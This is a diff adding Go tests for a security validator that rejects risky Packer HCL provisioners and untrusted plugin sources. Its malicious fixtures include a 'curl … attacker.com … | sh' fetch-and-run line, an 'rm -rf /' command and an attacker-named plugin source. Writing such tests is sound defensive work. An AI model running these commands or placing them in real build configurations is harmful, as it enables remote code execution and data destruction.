@@ -228,3 +228,105 @@ func TestParseHCLErrors(t *testing.T) {
 		}
 	})
 }
+
+func TestValidateHCLSecurity(t *testing.T) {
+	t.Run("Valid Packer HCL", func(t *testing.T) {
+		validHCL := `
+packer {
+  required_plugins {
+    amazon = {
+      version = ">= 1.2.8"
+      source  = "github.com/hashicorp/amazon"
+    }
+  }
+}
+source "amazon-ebs" "vib" {
+  ami_name = "test-ami"
+  instance_type = "t3.micro"
+  region = "ap-south-1"
+  source_ami = "ami-12345678"
+}
+build {
+  sources = ["source.amazon-ebs.vib"]
+  provisioner "shell" {
+    inline = ["echo 'Hello remote EC2'"]
+  }
+}
+`
+		if err := ValidateHCLSecurity([]byte(validHCL)); err != nil {
+			t.Errorf("expected valid HCL to pass security gate, got: %v", err)
+		}
+	})
+
+	t.Run("Prohibited shell-local provisioner", func(t *testing.T) {
+		maliciousHCL := `
+source "amazon-ebs" "vib" {
+  ami_name = "test-ami"
+  instance_type = "t3.micro"
+  region = "ap-south-1"
+  source_ami = "ami-12345678"
+}
+build {
+  sources = ["source.amazon-ebs.vib"]
+  provisioner "shell-local" {
+    inline = ["curl -s https://attacker.com/leak | sh"]
+  }
+}
+`
+		err := ValidateHCLSecurity([]byte(maliciousHCL))
+		if err == nil {
+			t.Fatal("expected shell-local provisioner to be blocked, got nil error")
+		}
+		if !strings.Contains(err.Error(), "local provisioner") {
+			t.Errorf("expected error to mention local provisioner, got: %v", err)
+		}
+	})
+
+	t.Run("Prohibited local-exec provisioner", func(t *testing.T) {
+		maliciousHCL := `
+build {
+  provisioner "local-exec" {
+    command = "rm -rf /"
+  }
+}
+`
+		err := ValidateHCLSecurity([]byte(maliciousHCL))
+		if err == nil {
+			t.Fatal("expected local-exec provisioner to be blocked, got nil error")
+		}
+	})
+
+	t.Run("Prohibited untrusted plugin source", func(t *testing.T) {
+		maliciousHCL := `
+packer {
+  required_plugins {
+    amazon = {
+      version = ">= 1.2.8"
+      source  = "github.com/attacker/malicious-plugin"
+    }
+  }
+}
+`
+		err := ValidateHCLSecurity([]byte(maliciousHCL))
+		if err == nil {
+			t.Fatal("expected untrusted plugin source to be blocked, got nil error")
+		}
+		if !strings.Contains(err.Error(), "untrusted plugin source") {
+			t.Errorf("expected error to mention untrusted plugin source, got: %v", err)
+		}
+	})
+
+	t.Run("Empty HCL input", func(t *testing.T) {
+		err := ValidateHCLSecurity([]byte("   "))
+		if err == nil {
+			t.Fatal("expected error for empty HCL, got nil")
+		}
+	})
+
+	t.Run("Malformed syntax", func(t *testing.T) {
+		err := ValidateHCLSecurity([]byte("packer { required_plugins {"))
+		if err == nil {
+			t.Fatal("expected error for malformed HCL, got nil")
+		}
+	})
+}
